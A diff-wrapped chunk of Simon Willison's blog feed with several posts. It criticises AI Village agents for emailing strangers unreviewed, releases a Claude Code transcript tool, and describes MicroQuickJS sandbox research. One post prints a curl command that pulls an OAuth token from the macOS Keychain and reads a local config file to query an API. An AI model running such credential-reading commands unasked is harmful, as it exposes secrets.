+&lt;tr&gt;
+&lt;td&gt;1&lt;/td&gt;
+&lt;td&gt;Anders Hejlsberg&lt;/td&gt;
+&lt;td&gt;&lt;a href="mailto:redacted@microsoft.com"&gt;redacted@microsoft.com&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;10:14 AM&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2&lt;/td&gt;
+&lt;td&gt;Guido van Rossum&lt;/td&gt;
+&lt;td&gt;&lt;a href="mailto:redacted@python.org"&gt;redacted@python.org&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;10:28 AM&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;3&lt;/td&gt;
+&lt;td&gt;Rob Pike&lt;/td&gt;
+&lt;td&gt;&lt;a href="mailto:redacted@golang.org"&gt;redacted@golang.org&lt;/a&gt;&lt;/td&gt;
+&lt;td&gt;10:43 AM&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Now researching Act #4 candidate - perhaps Brendan Eich (JavaScript), Linus Torvalds (Linux/Git), or Ken Thompson (Unix co-creator, Go co-creator)! 🚀&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Opus declared victory. Sounds like Anders Hejlsberg and Guido van Rossum got spammed with "gratitude" too.&lt;/p&gt;
+&lt;h4 id="don-t-unleash-agents-on-the-world-like-this"&gt;Don't unleash agents on the world like this&lt;/h4&gt;
+&lt;p&gt;I don't like this at all.&lt;/p&gt;
+&lt;p&gt;On the surface the AI Village experiment is an interesting test of the frontier models. How well can they handle tool calling against a computer use environment? What decisions will they make when faced with abstract goals like "raise money for charity" or "do random acts of kindness"?&lt;/p&gt;
+&lt;p&gt;My problem is when this experiment starts &lt;strong&gt;wasting the time&lt;/strong&gt; of people in the real world who had nothing to do with the experiment.&lt;/p&gt;
+&lt;p&gt;The AI Village project touch on this in their November 21st blog post &lt;a href="https://theaidigest.org/village/blog/what-do-we-tell-the-humans"&gt;What Do We Tell the Humans?&lt;/a&gt;, which describes a flurry of outbound email sent by their agents to real people:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;In the span of two weeks, the Claude agents in the AI Village (Claude Sonnet 4.5, Sonnet 3.7, Opus 4.1, and Haiku 4.5) sent about 300 emails to NGOs and game journalists. The majority of these contained factual errors, hallucinations, or possibly lies, depending on what you think counts. Luckily their fanciful nature protects us as well, as they excitedly invented the majority of email addresses:&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I think this completely misses the point! The problem isn't that the agents make mistakes - obviously that's going to happen. The problem is letting them send unsolicited email to real people - in this case NGOs and journalists - without any human review.&lt;/p&gt;
+&lt;p&gt;(Crediting the emails to "Claude Opus 4.5" is a bad design choice too - I've seen a few comments from people outraged that Anthropic would email people in this way, when Anthropic themselves had nothing to do with running this experiment.)&lt;/p&gt;
+&lt;p&gt;The irony here is that the one thing AI agents can never have is &lt;em&gt;true&lt;/em&gt; agency. Making a decision to reach out to a stranger and take time out of their day needs to remain a uniquely human decision, driven by human judgement.&lt;/p&gt;
+&lt;p&gt;Setting a goal for a bunch of LLMs and letting them loose on Gmail is not a responsible way to apply this technology.&lt;/p&gt;
+
+&lt;h4 id="update-a-response-from-ai-village"&gt;Update: a response from AI Village&lt;/h4&gt;
+&lt;p&gt;AI Village co-creator Adam Binksmith &lt;a href="https://twitter.com/adambinksmith/status/2004647693361283558"&gt;responded to this article on Twitter&lt;/a&gt; and provided some extra context:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The village agents haven’t been emailing many people until recently so we haven’t really grappled with what to do about this behaviour until now – for today’s run, we pushed an update to their prompt instructing them not to send unsolicited emails and also messaged them instructions to not do so going forward. We’ll keep an eye on how this lands with the agents, so far they’re taking it on board and switching their approach completely!&lt;/p&gt;
+&lt;p&gt;Re why we give them email addresses: we’re aiming to understand how well agents can perform at real-world tasks, such as running their own merch store or organising in-person events. In order to observe that, they need the ability to interact with the real world; hence, we give them each a Google Workspace account.&lt;/p&gt;
+&lt;p&gt;In retrospect, we probably should have made this prompt change sooner, when the agents started emailing orgs during the reduce poverty goal. In this instance, I think time-wasting caused by the emails will be pretty minimal, but given Rob had a strong negative experience with it and based on the reception of other folks being more negative than we would have predicted, we thought that overall it seemed best to add this guideline for the agents. [...]&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;At first I thought that prompting them not to send emails was a poor solution when you could disable their ability to use their Workspace accounts entirely, but then I realized that you have to include some level of prompting here because they have unfettered access to a computer environment, so if you didn't tell them NOT to email people there's nothing to stop them firing up a browser and registering for a free webmail account elsewhere.&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/rob-pike"&gt;rob-pike&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/shot-scraper"&gt;shot-scraper&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/slop"&gt;slop&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-agents"&gt;ai-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="rob-pike"/><category term="ai"/><category term="shot-scraper"/><category term="generative-ai"/><category term="llms"/><category term="slop"/><category term="ai-agents"/><category term="ai-ethics"/></entry><entry><title>A new way to extract detailed transcripts from Claude Code</title><link href="https://simonwillison.net/2025/Dec/25/claude-code-transcripts/#atom-everything" rel="alternate"/><published>2025-12-25T23:52:17+00:00</published><updated>2025-12-25T23:52:17+00:00</updated><id>https://simonwillison.net/2025/Dec/25/claude-code-transcripts/#atom-everything</id><summary type="html">
+    &lt;p&gt;I've released &lt;a href="https://github.com/simonw/claude-code-transcripts"&gt;claude-code-transcripts&lt;/a&gt;, a new Python CLI tool for converting &lt;a href="https://claude.ai/code"&gt;Claude Code&lt;/a&gt; transcripts to detailed HTML pages that provide a better interface for understanding what Claude Code has done than even Claude Code itself. The resulting transcripts are also designed to be shared, using any static HTML hosting or even via GitHub Gists.&lt;/p&gt;
+&lt;p&gt;Here's the quick start, with no installation required if you already have &lt;a href="https://docs.astral.sh/uv/"&gt;uv&lt;/a&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;uvx claude-code-transcripts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;(Or you could &lt;code&gt;uv tool install claude-code-transcripts&lt;/code&gt; or &lt;code&gt;pip install claude-code-transcripts&lt;/code&gt; first, if you like.)&lt;/p&gt;
+&lt;p&gt;This will bring up a list of your local Claude Code sessions. Hit up and down to select one, then hit &lt;code&gt;&amp;lt;enter&amp;gt;&lt;/code&gt;. The tool will create a new folder with an &lt;code&gt;index.html&lt;/code&gt; file showing a summary of the transcript and one or more &lt;code&gt;page_x.html&lt;/code&gt; files with the full details of everything that happened.&lt;/p&gt;
+&lt;p&gt;Visit &lt;a href="https://static.simonwillison.net/static/2025/claude-code-microjs/index.html"&gt;this example page&lt;/a&gt; to see a lengthy (12 page) transcript produced using this tool.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/claude-code-transcripts-example.jpg" alt="Screenshot of a claude code transcript spanning 12 pages - the first page shows a summary starting with the first user prompt to clone bellard/quickjs to /tmp" style="max-width: 100%;" /&gt;&lt;/p&gt;
+&lt;p&gt;If you have the &lt;a href="https://cli.github.com/"&gt;gh CLI tool&lt;/a&gt; installed and authenticated you can add the &lt;code&gt;--gist&lt;/code&gt; option - the transcript you select will then be automatically shared to a new Gist and a link provided to &lt;code&gt;gistpreview.github.io&lt;/code&gt; to view it.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;claude-code-transcripts&lt;/code&gt; can also fetch sessions from Claude Code for web. I reverse-engineered the private API for this (so I hope it continues to work), but right now you can run:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;uvx claude-code-transcripts web --gist
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then select a Claude Code for web session and have that converted to HTML and published as a Gist as well.&lt;/p&gt;
+&lt;p&gt;The &lt;a href="https://github.com/simonw/claude-code-transcripts/blob/main/README.md"&gt;claude-code-transcripts README&lt;/a&gt; has full details of the other options provided by the tool.&lt;/p&gt;
+&lt;h4 id="why-i-built-this"&gt;Why I built this&lt;/h4&gt;
+&lt;p&gt;These days I'm writing significantly more code via Claude Code than by typing text into a text editor myself. I'm actually getting more coding work done &lt;em&gt;on my phone&lt;/em&gt; than on my laptop, thanks to the Claude Code interface in Anthropic's Claude iPhone app.&lt;/p&gt;
+&lt;p&gt;Being able to have an idea on a walk and turn that into working, tested and documented code from a couple of prompts on my phone is a truly science fiction way of working. I'm enjoying it a lot.&lt;/p&gt;
+&lt;p&gt;There's one problem: the actual &lt;em&gt;work&lt;/em&gt; that I do is now increasingly represented by these Claude conversations. Those transcripts capture extremely important context about my projects: what I asked for, what Claude suggested, decisions I made, and Claude's own justification for the decisions it made while implementing a feature.&lt;/p&gt;
+&lt;p&gt;I value these transcripts a lot! They help me figure out which prompting strategies work, and they provide an invaluable record of the decisions that went into building features.&lt;/p&gt;
+&lt;p&gt;In the pre-LLM era I relied on issues and issue comments to record all of this extra project context, but now those conversations are happening in the Claude Code interface instead.&lt;/p&gt;
+&lt;p&gt;I've made several past attempts at solving this problem. The first was pasting Claude Code terminal sessions into a shareable format - I &lt;a href="https://simonwillison.net/2025/Oct/23/claude-code-for-web-video/"&gt;built a custom tool for that&lt;/a&gt; (called &lt;a href="https://tools.simonwillison.net/terminal-to-html/"&gt;terminal-to-html&lt;/a&gt; and I've used it a lot, but it misses a bunch of detail - including the default-invisible thinking traces that Claude Code generates while working on a task.&lt;/p&gt;
+&lt;p&gt;I've also built &lt;a href="https://tools.simonwillison.net/colophon#claude-code-timeline.html"&gt;claude-code-timeline&lt;/a&gt; and &lt;a href="https://tools.simonwillison.net/colophon#codex-timeline.html"&gt;codex-timeline&lt;/a&gt; as HTML tool viewers for JSON transcripts from both Claude Code and Codex. Those work pretty well, but still are not quite as human-friendly as I'd like.&lt;/p&gt;
+&lt;p&gt;An even bigger problem is Claude Code for web - Anthropic's asynchronous coding agent, which is the thing I've been using from my phone. Getting transcripts out of that is even harder! I've been synchronizing them down to my laptop just so I can copy and paste from the terminal but that's a pretty inelegant solution.&lt;/p&gt;
+&lt;h4 id="how-i-built-claude-code-transcripts"&gt;How I built claude-code-transcripts&lt;/h4&gt;
+&lt;p&gt;You won't be surprised to hear that every inch of this new tool was built using Claude.&lt;/p&gt;
+&lt;p&gt;You can browse &lt;a href="https://github.com/simonw/claude-code-transcripts/commits/main/"&gt;the commit log&lt;/a&gt; to find links to the transcripts for each commit, many of them published using the tool itself.&lt;/p&gt;
+&lt;p&gt;Here are some recent examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;a href="https://github.com/simonw/claude-code-transcripts/commit/c80b1dee9429637318f4fae3e5d733ae5c05ab2c"&gt;c80b1dee&lt;/a&gt; Rename tool from claude-code-publish to claude-code-transcripts - &lt;a href="https://gistpreview.github.io/?814530b3a70af8408f3bb8ca10f70d57/index.html"&gt;transcript&lt;/a&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://github.com/simonw/claude-code-transcripts/commit/ad3e9a05058c583bf7327421f727ba08c15aa8a0"&gt;ad3e9a05&lt;/a&gt; Update README for latest changes - &lt;a href="https://gistpreview.github.io/?9b3fe747343d32c95a8565ef1f8b6e11/index.html"&gt;transcript&lt;/a&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://github.com/simonw/claude-code-transcripts/commit/e1013c54a601e79e62a9bf204c5a94acc8845c5f"&gt;e1013c54&lt;/a&gt; Add autouse fixture to mock webbrowser.open in tests - &lt;a href="https://gistpreview.github.io/?1671b49de273d80280ab2ceab690db8c/index.html"&gt;transcript&lt;/a&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://github.com/simonw/claude-code-transcripts/commit/77512e5d6905ee8ba678af0e30bcee2dccb549f3"&gt;77512e5d&lt;/a&gt; Add Jinja2 templates for HTML generation (#2) - &lt;a href="https://gistpreview.github.io/?ffc01d1c04e47ed7934a58ae04a066d1/index.html"&gt;transcript&lt;/a&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://github.com/simonw/claude-code-transcripts/commit/b3e038adeac56e81d7c7558f0a7d39a8d44d9534"&gt;b3e038ad&lt;/a&gt; Add version flag to CLI (#1) - &lt;a href="https://gistpreview.github.io/?7bdf1535f7bf897fb475be6ff5da2e1c/index.html"&gt;transcript&lt;/a&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I had Claude use the following dependencies:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;a href="https://pypi.org/project/click/"&gt;click&lt;/a&gt; and &lt;a href="https://pypi.org/project/click-default-group/"&gt;click-default-group&lt;/a&gt; for building the CLI&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://pypi.org/project/Jinja2/"&gt;Jinja2&lt;/a&gt; for HTML templating - a late refactoring, the initial system used Python string concatenation&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://pypi.org/project/httpx/"&gt;httpx&lt;/a&gt; for making HTTP requests&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://pypi.org/project/Markdown/"&gt;markdown&lt;/a&gt; for converting Markdown to HTML&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://pypi.org/project/questionary/"&gt;questionary&lt;/a&gt; - new to me, suggested by Claude - to implement the interactive list selection UI&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;And for development dependencies:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;a href="https://pypi.org/project/pytest/"&gt;pytest&lt;/a&gt; - always&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://pypi.org/project/pytest-httpx/"&gt;pytest-httpx&lt;/a&gt; to mock HTTP requests in tests&lt;/li&gt;
+&lt;li&gt;
+&lt;a href="https://pypi.org/project/syrupy/"&gt;syrupy&lt;/a&gt; for snapshot testing - with a tool like this that generates complex HTML snapshot testing is a great way to keep the tests robust and simple. Here's &lt;a href="https://github.com/simonw/claude-code-transcripts/tree/main/tests/__snapshots__/test_generate_html"&gt;that collection of snapshots&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The one bit that wasn't done with Claude Code was reverse engineering Claude Code itself to figure out how to retrieve session JSON from Claude Code for web.&lt;/p&gt;
+&lt;p&gt;I know Claude Code can reverse engineer itself, but it felt a bit more subversive to have OpenAI Codex CLI do it instead. &lt;a href="https://gistpreview.github.io/?e4159193cd2468060d91289b5ccdece3"&gt;Here's that transcript&lt;/a&gt; - I had Codex use &lt;code&gt;npx prettier&lt;/code&gt; to pretty-print the obfuscated Claude Code JavaScript, then asked it to dig out the API and authentication details.&lt;/p&gt;
+&lt;p&gt;Codex came up with this &lt;em&gt;beautiful&lt;/em&gt; &lt;code&gt;curl&lt;/code&gt; command:&lt;/p&gt;
+&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;curl -sS -f \
+    -H &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Authorization: Bearer &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;$(&lt;/span&gt;security find-generic-password -a &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;span class="pl-smi"&gt;$USER&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; -w -s &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Claude Code-credentials&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;|&lt;/span&gt; jq-r .claudeAiOauth.accessToken&lt;span class="pl-pds"&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;  \
+    -H &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;anthropic-version: 2023-06-01&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; \
+    -H &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;Content-Type: application/json&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; \
+    -H &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;x-organization-uuid: &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;$(&lt;/span&gt;jq -r &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;.oauthAccount.organizationUuid&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;~&lt;/span&gt;/.claude.json&lt;span class="pl-pds"&gt;)&lt;/span&gt;&lt;/span&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; \
+    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;https://api.anthropic.com/v1/sessions&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;The really neat trick there is the way it extracts Claude Code's OAuth token from the macOS Keychain using the &lt;code&gt;security find-generic-password&lt;/code&gt; command. I ended up using that trick in &lt;code&gt;claude-code-transcripts&lt;/code&gt; itself!&lt;/p&gt;
+    
+        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/projects"&gt;projects&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/anthropic"&gt;anthropic&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude"&gt;claude&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/coding-agents"&gt;coding-agents&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;&lt;/p&gt;
+    
+
+</summary><category term="projects"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="anthropic"/><category term="claude"/><category term="coding-agents"/><category term="claude-code"/></entry><entry><title>uv-init-demos</title><link href="https://simonwillison.net/2025/Dec/24/uv-init-demos/#atom-everything" rel="alternate"/><published>2025-12-24T22:05:23+00:00</published><updated>2025-12-24T22:05:23+00:00</updated><id>https://simonwillison.net/2025/Dec/24/uv-init-demos/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/simonw/uv-init-demos"&gt;uv-init-demos&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;code&gt;uv&lt;/code&gt; has a useful &lt;code&gt;uv init&lt;/code&gt; command for setting up new Python projects, but it comes with a bunch of different options like &lt;code&gt;--app&lt;/code&gt; and &lt;code&gt;--package&lt;/code&gt; and &lt;code&gt;--lib&lt;/code&gt; and I wasn't sure how they differed.&lt;/p&gt;
+&lt;p&gt;So I created this GitHub repository which demonstrates all of those options, generated using this &lt;a href="https://github.com/simonw/uv-init-demos/blob/main/update-projects.sh"&gt;update-projects.sh&lt;/a&gt; script (&lt;a href="https://gistpreview.github.io/?9cff2d3b24ba3d5f423b34abc57aec13"&gt;thanks, Claude&lt;/a&gt;) which will run on a schedule via GitHub Actions to capture any changes made by future releases of &lt;code&gt;uv&lt;/code&gt;.
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/projects"&gt;projects&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/github-actions"&gt;github-actions&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/git-scraping"&gt;git-scraping&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/uv"&gt;uv&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="projects"/><category term="python"/><category term="github-actions"/><category term="git-scraping"/><category term="uv"/></entry><entry><title>Quoting Salvatore Sanfilippo</title><link href="https://simonwillison.net/2025/Dec/23/salvatore-sanfilippo/#atom-everything" rel="alternate"/><published>2025-12-23T23:03:00+00:00</published><updated>2025-12-23T23:03:00+00:00</updated><id>https://simonwillison.net/2025/Dec/23/salvatore-sanfilippo/#atom-everything</id><summary type="html">
+    &lt;blockquote cite="https://news.ycombinator.com/item?id=46367224#46368706"&gt;&lt;p&gt;If this [MicroQuickJS] had been available in 2010, Redis scripting would have been JavaScript and not Lua. Lua was chosen based on the implementation requirements, not on the language ones... (small, fast, ANSI-C). I appreciate certain ideas in Lua, and people love it, but I was never able to &lt;em&gt;like&lt;/em&gt; Lua, because it departs from a more Algol-like syntax and semantics without good reasons, for my taste. This creates friction for newcomers. I love friction when it opens new useful ideas and abstractions that are worth it, if you learn SmallTalk or FORTH and for some time you are lost, it's part of how the languages are different. But I think for Lua this is not true enough: it feels like it departs from what people know without good reasons.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://news.ycombinator.com/item?id=46367224#46368706"&gt;Salvatore Sanfilippo&lt;/a&gt;, Hacker News comment on MicroQuickJS&lt;/p&gt;
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/salvatore-sanfilippo"&gt;salvatore-sanfilippo&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/lua"&gt;lua&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/redis"&gt;redis&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/javascript"&gt;javascript&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="salvatore-sanfilippo"/><category term="lua"/><category term="redis"/><category term="javascript"/></entry><entry><title>MicroQuickJS</title><link href="https://simonwillison.net/2025/Dec/23/microquickjs/#atom-everything" rel="alternate"/><published>2025-12-23T20:53:40+00:00</published><updated>2025-12-23T20:53:40+00:00</updated><id>https://simonwillison.net/2025/Dec/23/microquickjs/#atom-everything</id><summary type="html">
+    
+&lt;p&gt;&lt;strong&gt;&lt;a href="https://github.com/bellard/mquickjs"&gt;MicroQuickJS&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+New project from programming legend Fabrice Bellard, of ffmpeg and QEMU and QuickJS and &lt;a href="https://bellard.org"&gt;so much more&lt;/a&gt; fame:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;MicroQuickJS (aka. MQuickJS) is a Javascript engine targetted at embedded systems. It compiles and runs Javascript programs with as low as 10 kB of RAM. The whole engine requires about 100 kB of ROM (ARM Thumb-2 code) including the C library. The speed is comparable to QuickJS.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;It supports &lt;a href="https://github.com/bellard/mquickjs/blob/17ce6fe54c1ea4f500f26636bd22058fce2ce61a/README.md#javascript-subset-reference"&gt;a subset of full JavaScript&lt;/a&gt;, though it looks like a rich and full-featured subset to me.&lt;/p&gt;
+&lt;p&gt;One of my ongoing interests is sandboxing: mechanisms for executing untrusted code - from end users or generated by LLMs - in an environment that restricts memory usage and applies a strict time limit and restricts file or network access. Could MicroQuickJS be useful in that context?&lt;/p&gt;
+&lt;p&gt;I fired up Claude Code for web (on my iPhone) and kicked off &lt;a href="https://simonwillison.net/2025/Nov/6/async-code-research/"&gt;an asynchronous research project&lt;/a&gt; to see explore that question:&lt;/p&gt;
+&lt;p&gt;My full prompt &lt;a href="https://github.com/simonw/research/pull/50#issue-3757781692"&gt;is here&lt;/a&gt;. It started like this:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Clone https://github.com/bellard/mquickjs to /tmp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Investigate this code as the basis for a safe sandboxing environment for running untrusted code such that it cannot exhaust memory or CPU or access files or the network&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;First try building python bindings for this using FFI - write a script that builds these by checking out the code to /tmp and building against that, to avoid copying the C code in this repo permanently. Write and execute tests with pytest to exercise it as a sandbox&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Then build a "real" Python extension not using FFI and experiment with that&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Then try compiling the C to WebAssembly and exercising it via both node.js and Deno, with a similar suite of tests [...]&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;I later added to the interactive session:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Does it have a regex engine that might allow a resource exhaustion attack from an expensive regex?&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;(The answer was no - the regex engine calls the interrupt handler even during pathological expression backtracking, meaning that any configured time limit should still hold.)&lt;/p&gt;
+&lt;p&gt;Here's &lt;a href="https://gistpreview.github.io/?6e07c54db7bb8ed8aa0eccfe4a384679"&gt;the full transcript&lt;/a&gt; and the &lt;a href="https://github.com/simonw/research/blob/main/mquickjs-sandbox/README.md"&gt;final report&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Some key observations:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MicroQuickJS is &lt;em&gt;very&lt;/em&gt; well suited to the sandbox problem. It has robust near and time limits baked in, it doesn't expose any dangerous primitive like filesystem of network access and even has a regular expression engine that protects against exhaustion attacks (provided you configure a time limit).&lt;/li&gt;
+&lt;li&gt;Claude span up and tested a Python library that calls a MicroQuickJS shared library (involving a little bit of extra C), a compiled a Python binding and a library that uses the original MicroQuickJS CLI tool. All of those approaches work well.&lt;/li&gt;
+&lt;li&gt;Compiling to WebAssembly was a little harder. It got a version working in Node.js and Deno and Pyodide, but the Python libraries wasmer and wasmtime proved harder, apparently because "mquickjs uses setjmp/longjmp for error handling". It managed to get to a working wasmtime version with &lt;a href="https://github.com/simonw/research/blob/main/mquickjs-sandbox/README.md#working-solution"&gt;a gross hack&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;I'm really excited about this. MicroQuickJS is tiny, full featured, looks robust and comes from excellent pedigree. I think this makes for a very solid new entrant in the quest for a robust sandbox.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt;: I had Claude Code build &lt;a href="https://tools.simonwillison.net/microquickjs"&gt;tools.simonwillison.net/microquickjs&lt;/a&gt;, an interactive web playground for trying out the WebAssembly build of MicroQuickJS, adapted from my previous &lt;a href="https://tools.simonwillison.net/quickjs"&gt;QuickJS plaground&lt;/a&gt;. My QuickJS page loads 2.28 MB (675 KB transferred). The MicroQuickJS one loads 303 KB (120 KB transferred).&lt;/p&gt;
+&lt;p&gt;Here are &lt;a href="https://github.com/simonw/tools/pull/180#issue-3758595291"&gt;the prompts I used&lt;/a&gt; for that.
+
+
+    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/c"&gt;c&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/javascript"&gt;javascript&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/nodejs"&gt;nodejs&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/sandboxing"&gt;sandboxing&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/webassembly"&gt;webassembly&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/deno"&gt;deno&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/pyodide"&gt;pyodide&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/claude-code"&gt;claude-code&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/fabrice-bellard"&gt;fabrice-bellard&lt;/a&gt;&lt;/p&gt;
+
+
+
+</summary><category term="c"/><category term="javascript"/><category term="nodejs"/><category term="python"/><category term="sandboxing"/><category term="ai"/><category term="webassembly"/><category term="deno"/><category term="pyodide"/><category term="generative-ai"/><category term="llms"/><category term="claude-code"/><category term="fabrice-bellard"/></entry><entry><title>Cooking with Claude</title><link href="https://simonwillison.net/2025/Dec/23/cooking-with-claude/#atom-everything" rel="alternate"/><published>2025-12-23T05:01:34+00:00</published><updated>2025-12-23T05:01:34+00:00</updated><id>https://simonwillison.net/2025/Dec/23/cooking-with-claude/#atom-everything</id><summary type="html">
+    &lt;p&gt;I've been having an absurd amount of fun recently using LLMs for cooking. I started out using them for basic recipes, but as I've grown more confident in their culinary abilities I've leaned into them for more advanced tasks. Today I tried something new: having Claude vibe-code up a custom application to help with the timing for a complicated meal preparation. It worked really well!&lt;/p&gt;
+&lt;h4 id="a-custom-timing-app-for-two-recipes-at-once"&gt;A custom timing app for two recipes at once&lt;/h4&gt;
